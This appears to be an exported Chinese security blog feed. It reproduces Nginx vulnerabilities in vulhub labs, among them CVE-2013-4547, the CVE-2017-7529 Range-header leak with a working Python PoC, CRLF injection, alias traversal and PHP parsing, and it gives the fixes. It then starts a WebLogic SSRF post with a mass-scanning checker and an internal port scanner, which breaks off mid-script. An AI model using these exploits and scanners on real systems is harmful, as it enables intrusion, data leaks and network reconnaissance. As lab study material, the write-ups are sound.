<p>而存在CVE-2013-4547的情况下，我们构造payload：<code>http://127.0.0.1/test.jpg[0x20][0x00].php</code><br>注意： 0x20指 (空格)、 0x00指<code>\0</code>(截止符)、 还有一个0x2e指分隔符</p>
<p>这个URL可以匹配上正则 <code>\.php$</code> ，可以进入这个Location块；但进入之后，Nginx却错误地认为请求的文件是 <code>test.jpg[0x20]</code> ，就设置其为<code>SCRIPT_FILENAME</code>的值发送给 fastcgi 。</p>
<p>fastcgi根据<code>SCRIPT_FILENAME</code>的值进行解析，最后造成了解析漏洞。</p>
<p>所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。</p>
<p><strong>再举个例子</strong></p>
<p>比如很多网站限制了允许访问后台的IP：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;admin&#x2F; &#123;</span><br><span class="line">	allow 127.0.0.1;</span><br><span class="line">	deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以请求如下URL： <code>/test[0x20]/../admin/index.php</code> ，这个URI不会匹配上location后面的 <code>/admin/</code> ，也就绕过了其中的IP验证；但最后请求的是 <code>/test[0x20]/../admin/index.php</code> 文件，也就是<code>/admin/index.php</code>，成功访问到后台。<br>（<strong>注意：</strong>这个前提是需要有一个目录叫<code>test</code>：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动漏洞环境：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>靶机IP： <code>192.168.220.141</code><br>环境启动后，访问<code>http://192.168.220.141:8080/</code>即可看到一个上传页面。</p>
<p><img src="/posts/24706/1.png" alt></p>
<p>这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用CVE-2013-4547。我们上传一个<code>123.jpg</code>，<strong>注意后面的空格</strong></p>
<p><img src="/posts/24706/2.png" alt></p>
<p>上传成功，尝试去该路径下访问“123.jpg ”文件，界面报404错误</p>
<p><img src="/posts/24706/3.png" alt></p>
<p>上传的文件找不到，是因为浏览器自动将空格编码为%20，服务器中找不到名为“test2.jpg%20”的文件</p>
<p>接下来，我们想要上传的jpg文件作为php解析，就需要利用未编码的空格和截止符（\0）进行构造，构造请求如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.141:8080&#x2F;uploadfiles&#x2F;test.jpgAA.php</span><br><span class="line">#AA只是起到占位的作用</span><br></pre></td></tr></table></figure>

<p>发送请求并使用burpsuite抓包。使用burpsuite将AA分别更改为20（空格）、00（截止符\0）</p>
<p>这样我们发送的请求就变为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.141:8080&#x2F;uploadfiles&#x2F;test.jpg[0x20][0x00].php</span><br></pre></td></tr></table></figure>

<p>Nginx解析后，将“test.jpg ”文件当做php文件解析。</p>
<p><img src="/posts/24706/4.png" alt></p>
<h2 id="越界读取缓存漏洞-CVE-2017-7529"><a href="#越界读取缓存漏洞-CVE-2017-7529" class="headerlink" title="越界读取缓存漏洞(CVE-2017-7529)"></a>越界读取缓存漏洞(CVE-2017-7529)</h2><h3 id="漏洞说明-1"><a href="#漏洞说明-1" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括 “文件头”+“HTTP返回包头”+“HTTP返回包体” 。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。</p>
<p>如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>靶机IP： <code>192.168.220.150</code></p>
<p>访问 <code>192.168.220.150:8080</code> ，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。</p>
<p>调用<code>python3 poc.py http://your-ip:8080/</code>，读取返回结果：</p>
<p>poc.py(基于python3)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print(&quot;%s url&quot; % (sys.argv[0]))</span><br><span class="line">    print(&quot;eg: python %s http:&#x2F;&#x2F;your-ip:8080&#x2F;&quot; % (sys.argv[0]))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">    &#39;User-Agent&#39;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;42.0.2311.135 Safari&#x2F;537.36 Edge&#x2F;12.10240&quot;</span><br><span class="line">&#125;</span><br><span class="line">offset &#x3D; 605  # 可以修改</span><br><span class="line">url &#x3D; sys.argv[1]</span><br><span class="line">file_len &#x3D; len(requests.get(url, headers&#x3D;headers).content)</span><br><span class="line">n &#x3D; file_len + offset</span><br><span class="line">headers[&#39;Range&#39;] &#x3D; &quot;bytes&#x3D;-%d,-%d&quot; % (</span><br><span class="line">    n, 0x8000000000000000 - n)</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(url, headers&#x3D;headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# python3 poc.py http:&#x2F;&#x2F;192.168.220.150:8080&#x2F;</span><br><span class="line"></span><br><span class="line">--00000000000000000006</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Range: bytes -605-611&#x2F;612</span><br><span class="line"></span><br><span class="line">’;A]b&#96;RY:9A]r«\me&quot;59526062-264&quot;  ##</span><br><span class="line">KEY: http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;      ## 缓存文件头</span><br><span class="line"></span><br><span class="line">## HTTP返回头</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.13.2</span><br><span class="line">Date: Wed, 31 Jul 2019 06:46:18 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 612</span><br><span class="line">Last-Modified: Tue, 27 Jun 2017 13:40:50 GMT</span><br><span class="line">Connection: close</span><br><span class="line">ETag: &quot;59526062-264&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        width: 35em;</span><br><span class="line">        margin: 0 auto;</span><br><span class="line">        font-family: Tahoma, Verdana, Arial, sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome to nginx!&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class="line">working. Further configuration is required.&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;For online documentation and support please refer to</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;nginx.org&#x2F;&quot;&gt;nginx.org&lt;&#x2F;a&gt;.&lt;br&#x2F;&gt;</span><br><span class="line">Commercial support is available at</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;nginx.com&#x2F;&quot;&gt;nginx.com&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">--00000000000000000006</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Range: bytes -9223372036854773979-611&#x2F;612</span><br></pre></td></tr></table></figure>

<p>可见，越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。</p>
<h2 id="配置错误导致漏洞"><a href="#配置错误导致漏洞" class="headerlink" title="配置错误导致漏洞"></a>配置错误导致漏洞</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>运行成功后，Nginx将会监听8080/8081/8081三个端口，分别对应三种漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. CRLF注入漏洞</span><br><span class="line">2. 目录穿越漏洞</span><br><span class="line">3. add_header被覆盖</span><br></pre></td></tr></table></figure>

<h3 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h3><h4 id="漏洞说明-2"><a href="#漏洞说明-2" class="headerlink" title="漏洞说明"></a>漏洞说明</h4><p>CRLF是回车换行(\r\n)的简称，其十六进制的编码分别是0x0b和0x0a。<br>在http协议中，http消息头以明文的字符串格式传送，以冒号分隔的键/值对，如：Accept-Charset: utf-8，每一个消息头以回车符(CR)和换行符(LF)结尾。而在http消息头结束后，会使用两个连续的CR-LF来进行标识，用来分隔http 消息头 和 http 消息体（请求或响应的内容）。</p>
<p>当一个网站使用https协议的时候，很多站点会强制用户使用https进行访问。当用户访问http的时候会302跳转到https页面。<br>如果使用了 $uri来进行配置，可能会导致CRLF注入漏洞</p>
<p>Nginx中错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">    return 302 https:&#x2F;&#x2F;$host$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>nginx中     <code>\$uri</code> 指的是请求的文件和路径，不会包含后面请求的数据（即?和#后面的数据）</p>
<p>nginx服务器会对 <code>$uri</code> 进行解码。当我们在传入的参数后面加入urlencode之后的换行符 <code>%0d%0a</code> ，我们就可以污染HTTP头的数据</p>
<p><strong>举个例子</strong><br>访问<code>http://your_ip/302/123</code>会302跳转到<code>https://your_ip/302/123</code>。这是正常的跳转。<br>但是由于配置文件里面使用的是<code>$uri</code>，会对我们传入的参数进行转码，当我们访问<code>http://your_ip/302/123%0d%0a%0d%0atest=1</code>时，302跳转会指向<code>https://your_ip/302/123</code>并且POST一个参数 <code>test=1</code></p>
<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>正常发送请求</p>
<p><img src="/posts/24706/5.png" alt></p>
<p><strong>漏洞利用</strong></p>
<ol>
<li><p>会话固定</p>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.150:8080&#x2F;%0d%0aSet-Cookie:%20session&#x3D;hacker</span><br></pre></td></tr></table></figure>
<p><img src="/posts/24706/6.png" alt></p>
<p>可以从响应包中看出，我们利用该漏洞成功了控制了cookie</p>
</li>
<li><p>反射型XSS</p>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.150:8080&#x2F;%0d%0a%0d%0a&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/24706/7.png" alt></p>
<p>我们可以看到响应包中，标签已经插入页面中，但是由于浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。<br>怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</p>
<p>还没成功！！！</p>
</li>
</ol>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>Nginx获取用户请求路径时，有三个可以表示uri的变量：</p>
<ul>
<li>$uri：表示解码以后的请求路径（不带参数）</li>
<li>$document_uri：表示解码以后的请求路径（不带参数）</li>
<li>$request_uri：表示完整的uri，没有解码</li>
</ul>
<p>所以修复该漏洞，我们需要将配置文件改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">    return 302 https:&#x2F;&#x2F;$host$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ol>
<li><a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></li>
</ol>
<h3 id="目录穿越漏洞"><a href="#目录穿越漏洞" class="headerlink" title="目录穿越漏洞"></a>目录穿越漏洞</h3><h4 id="漏洞说明-3"><a href="#漏洞说明-3" class="headerlink" title="漏洞说明"></a>漏洞说明</h4><p>Nginx在配置别名（Alias）的时候，如果忘记加<code>/</code>，将造成一个目录穿越漏洞。</p>
<p>错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;files &#123;</span><br><span class="line">	alias &#x2F;home&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>访问files目录，构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.150:8081&#x2F;files</span><br></pre></td></tr></table></figure>
<p><img src="/posts/24706/8.png" alt></p>
<p>目录穿越到根目录,构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.150:8081&#x2F;files..&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/24706/9.png" alt></p>
<p>此处留下一个疑问，能不能穿越到其他目录？？？</p>
<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>将/加在files后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;files&#x2F; &#123;</span><br><span class="line">	alias &#x2F;home&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="add-header被覆盖"><a href="#add-header被覆盖" class="headerlink" title="add_header被覆盖"></a>add_header被覆盖</h3><h4 id="漏洞说明-4"><a href="#漏洞说明-4" class="headerlink" title="漏洞说明"></a>漏洞说明</h4><p>Nginx配置文件子块（server、location、if）中的 <code>add_header</code> ，将会覆盖父块中的 <code>add_header</code> 添加的HTTP头，造成一些安全隐患。</p>
<p>如下列代码，整站（父块中）添加了CSP头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;;</span><br><span class="line">add_header X-Frame-Options DENY;</span><br><span class="line"></span><br><span class="line">location &#x3D; &#x2F;test1 &#123;</span><br><span class="line">    rewrite ^(.*)$ &#x2F;xss.html break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x3D; &#x2F;test2 &#123;</span><br><span class="line">    add_header X-Content-Type-Options nosniff;</span><br><span class="line">    rewrite ^(.*)$ &#x2F;xss.html break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但<code>/test2</code>的location中又添加了 <code>X-Content-Type-Options</code> 头，导致父块中的 <code>add_header</code> 全部失效</p>
<p><img src="/posts/24706/10.png" alt></p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="漏洞说明-5"><a href="#漏洞说明-5" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>Nginx解析漏洞是由于Nginx中php配置不当而造成的，与Nginx版本无关，但在高版本的php中，由于“security.limit_extensions”的引入，使得该漏洞难以被成功利用。</p>
<p>当用户请求的url后缀为123.jpg/123.php时，location对请求进行选择的时候会使用URI环境变量进行选择，其中传递到后端Fastcgi的关键变量SCRIPT_FILENAME由Nginx生成的$fastcgi_script_name决定。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">		fastcgi_index index.php;</span><br><span class="line"></span><br><span class="line">		include fastcgi_params;</span><br><span class="line"></span><br><span class="line">		fastcgi_param  REDIRECT_STATUS    200;</span><br><span class="line">		fastcgi_param  SCRIPT_FILENAME &#x2F;var&#x2F;www&#x2F;html$fastcgi_script_name;</span><br><span class="line">		fastcgi_param  DOCUMENT_ROOT &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">		fastcgi_pass php:9000;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>而为了较好的支持PATH_INFO的提取，在PHP的配置选项里存在cgi.fix_pathinfo选项，其目的是为了从SCRIPT_FILENAME里取出真正的脚本名。<br>一般情况下cgi.fix_pathinfo的值默认为1，也就是开启，从而引发该漏洞。当Nginx遇到文件路径“123.jpg/123.php”时，由于其后缀为.php文件，所以会被传到上述所示代码中，在查找文件时，若“123.jpg/123.php”不存在，则会去掉最后的“123.php”，然后判断“123.jpg”是否存在，若存在，则把“123.jpg”当做php解析。</p>
<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>靶机IP： <code>192.168.220.151</code></p>
<p><img src="/posts/24706/11.png" alt></p>
<p>这是一个文件上传页面，我们先写一个phpinfo函数，将其保存为test1.jpg，上传该文件，页面响应如下：</p>
<p><img src="/posts/24706/12.png" alt></p>
<p>抓包更改后，文件被重命名，并上传成功！</p>
<p><img src="/posts/24706/13.png" alt></p>
<p>接下来我们去尝试访问该文件，文件打不开</p>
<p>根据文件解析漏洞，我们构造payload格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.151&#x2F;uploadfiles&#x2F;重命名.jpg&#x2F;.php</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.151&#x2F;uploadfiles&#x2F;重命名.jpg&#x2F;重命名.php</span><br></pre></td></tr></table></figure>
<p><img src="/posts/24706/14.png" alt></p>
<p>这里可以直接上传图片马。</p>
<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ol>
<li>修改php.ini，设置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cgi.fix_pathinfo &#x3D; 0</span><br></pre></td></tr></table></figure></li>
<li>在Nginx的配置文件中添加<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( $fastcgi_script_name ~ ..&amp;&#x2F;.*php ) &#123;</span><br><span class="line">	return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>前两种方法可能会导致一些伪静态网页或者特殊的路径无法显示。第三种方法将以下代码写在fcgi.conf文件中<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($request_filename ~* (.*).php) &#123;</span><br><span class="line">    set $php_url $1;</span><br><span class="line">&#125;</span><br><span class="line">if (!-e $php_url.php) &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
参考：<a href="https://www.cnblogs.com/dami520/archive/2012/08/22/2651113.html" target="_blank" rel="noopener">https://www.cnblogs.com/dami520/archive/2012/08/22/2651113.html</a></li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic复现之ssrf</title>
    <url>/posts/28604.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天复现weblogic中的ssrf漏洞，以前也没学过ssrf，所以趁着这个机会再把ssrf学习一下。</p>
<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>SSRF(Server-Side Request Forgery，服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
<p>SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p>
<p>主要攻击方式如下：</p>
<ul>
<li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li>
<li>攻击运行在内网或本地的应用程序</li>
<li>对内网web应用进行指纹识别，识别企业内部的资产信息</li>
<li>攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2，SQli等)</li>
<li>利用file协议读取本地文件等</li>
</ul>
<h2 id="weblogic之ssrf"><a href="#weblogic之ssrf" class="headerlink" title="weblogic之ssrf"></a>weblogic之ssrf</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li><p>涉及版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.2</span><br><span class="line">10.3.6</span><br></pre></td></tr></table></figure>
</li>
<li><p>环境部署</p>
<p>进入ssrf环境</p>
<p> <code>cd vulhub/weblogic/ssrf</code></p>
<p>环境构建</p>
<p><code>sudo docker-compose build</code></p>
<p>启动环境</p>
<p><code>sudo docker-compose up -d</code></p>
</li>
<li><p>靶机配置</p>
<p>靶机IP： 192.168.220.141<br>端口：   7001<br>漏洞地址： <a href="http://192.168.220.141:7001/uddiexplorer/SearchPublicRegistries.jsp" target="_blank" rel="noopener">http://192.168.220.141:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
</li>
</ul>
<h3 id="复现攻击"><a href="#复现攻击" class="headerlink" title="复现攻击"></a>复现攻击</h3><ol>
<li><p>漏洞检测</p>
<p>检测脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import Queue</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">queue &#x3D; Queue.Queue()</span><br><span class="line">mutex &#x3D; threading.Lock()</span><br><span class="line">class Test(threading.Thread):</span><br><span class="line">    def __init__(self, queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue &#x3D; queue</span><br><span class="line">    def check(self,domain,ip):</span><br><span class="line">        payload &#x3D; &quot;uddiexplorer&#x2F;SearchPublicRegistries.jsp?operator&#x3D;&#123;ip&#125;&amp;rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&quot;.format(ip&#x3D;ip)</span><br><span class="line">        url &#x3D; domain + payload</span><br><span class="line">        try:</span><br><span class="line">            html &#x3D; requests.get(url&#x3D;url, timeout&#x3D;15, verify&#x3D;False).content</span><br><span class="line">            m &#x3D; re.search(&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;,html)</span><br><span class="line">            if m:</span><br><span class="line">                mutex.acquire()</span><br><span class="line">                with open(&#39;ssrf1.txt&#39;,&#39;a+&#39;) as f:</span><br><span class="line">                    print &quot;%s has weblogic ssrf.&quot; % domain</span><br><span class="line">                    f.write(&quot;%s has weblogic ssrf.&quot; % domain)</span><br><span class="line">                mutex.release()</span><br><span class="line">        except Exception,e:</span><br><span class="line">            print e</span><br><span class="line">    def get_registry(self,domain):</span><br><span class="line">        payload &#x3D; &#39;uddiexplorer&#x2F;SetupUDDIExplorer.jsp&#39;</span><br><span class="line">        url &#x3D; domain + payload</span><br><span class="line">        try:</span><br><span class="line">            html &#x3D; requests.get(url&#x3D;url, timeout&#x3D;15, verify&#x3D;False).content</span><br><span class="line">            m &#x3D; re.search(&#39;&lt;i&gt;For example: (.*?)&#x2F;uddi&#x2F;uddilistener.*?&lt;&#x2F;i&gt;&#39;,html)</span><br><span class="line">            if m:</span><br><span class="line">                return m.group(1)</span><br><span class="line">        except Exception,e:</span><br><span class="line">            print e</span><br><span class="line">    def run(self):</span><br><span class="line">        while not self.queue.empty():</span><br><span class="line">            domain &#x3D; self.queue.get()</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            print domain</span><br><span class="line">            mutex.release()</span><br><span class="line">            ip &#x3D; self.get_registry(domain)</span><br><span class="line">            self.check(domain,ip)</span><br><span class="line">            self.queue.task_done()</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    with open(&#39;domain.txt&#39;,&#39;r&#39;) as f:</span><br><span class="line">        lines &#x3D; f.readlines()</span><br><span class="line">    for line in lines:</span><br><span class="line">        queue.put(line.strip())</span><br><span class="line">    for x in xrange(1,50):</span><br><span class="line">        t &#x3D; Test(queue)</span><br><span class="line">        t.setDaemon(True)</span><br><span class="line">        t.start()</span><br><span class="line">    queue.join()</span><br></pre></td></tr></table></figure>

<p>检测结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# python check_weblogic_ssrf.py </span><br><span class="line">http:&#x2F;&#x2F;192.168.220.141:7001&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.220.141:7001&#x2F; has weblogic ssrf.</span><br></pre></td></tr></table></figure>
</li>
<li><p>手工进行简单检测，在漏洞地址处，点击Search按钮，返回：“An error has occurred”，可从漏洞页面下的“Setup UDDI Explorer”处发现内网地址：</p>
<p><img src="/posts/28604/1.png" alt></p>
<p>据说实际环境中该处可能会暴露内网地址<br>我们可以根据返回的不同状态信息，来判断内网的IP是否存在以及对应端口是否开放。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">内网网段：</span><br><span class="line">10.0.0.0 ~ 10.255.255.255，</span><br><span class="line">172.16.0.0 ~ 172.31.255.255 </span><br><span class="line">192.168.0.0 ~ 192.168.255.255</span><br></pre></td></tr></table></figure>
<p>这里有一个地方需要注意的是，需要知道目标内网网段。如果盲目的去进行网段扫描会耗费大量的时间。<br>一个简单的内网服务嗅探:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import thread</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">def ite_ip(ip):</span><br><span class="line">    for i in range(1, 256):</span><br><span class="line">        final_ip &#x3D; &#39;&#123;ip&#125;.&#123;i&#125;&#39;.format(ip&#x3D;ip, i&#x3D;i)</span><br><span class="line">        print final_ip</span><br><span class="line">        thread.start_new_thread(scan, (final_ip,))</span><br><span class="line">        time.sleep(2)</span><br><span class="line">def scan(final_ip):</span><br><span class="line">    ports &#x3D; (&#39;21&#39;, &#39;22&#39;, &#39;23&#39;, &#39;53&#39;, &#39;80&#39;, &#39;135&#39;, &#39;139&#39;, &#39;443&#39;, &#39;445&#39;, &#39;1080&#39;, &#39;1433&#39;, &#39;1521&#39;, &#39;3306&#39;, &#39;3389&#39;, &#39;4899&#39;, &#39;8080&#39;, &#39;7001&#39;, &#39;8000&#39;,&#39;6389&#39;,&#39;6379&#39;)</span><br><span class="line">    for port in ports:</span><br><span class="line">        vul_url &#x3D; &#39;http:&#x2F;&#x2F;172.20.10.13:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?operator&#x3D;http:&#x2F;&#x2F;%s:%s&amp;rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&#39; % (final_ip,port)</span><br><span class="line">        try:</span><br><span class="line">            #print vul_url</span><br><span class="line">            r &#x3D; requests.get(vul_url, timeout&#x3D;15, verify&#x3D;False)</span><br><span class="line">            result1 &#x3D; re.findall(&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;,r.content)</span><br><span class="line">            result2 &#x3D; 